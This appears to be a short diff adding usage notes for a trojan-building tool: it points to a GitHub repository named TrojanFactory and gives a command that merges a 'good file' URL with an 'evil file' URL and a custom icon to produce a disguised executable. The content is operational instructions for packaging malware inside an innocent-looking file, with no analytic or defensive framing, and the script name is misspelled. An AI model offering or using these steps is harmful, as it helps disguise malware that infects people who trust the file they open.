@@ -1,0 +1,5 @@
+# install, go to
+https://github.com/z00z/TrojanFactory
+
+# use it
+python tronjan_factory.py -f [url of good file] -e [url of evil file] -o [output file] -i [.ico icon file]
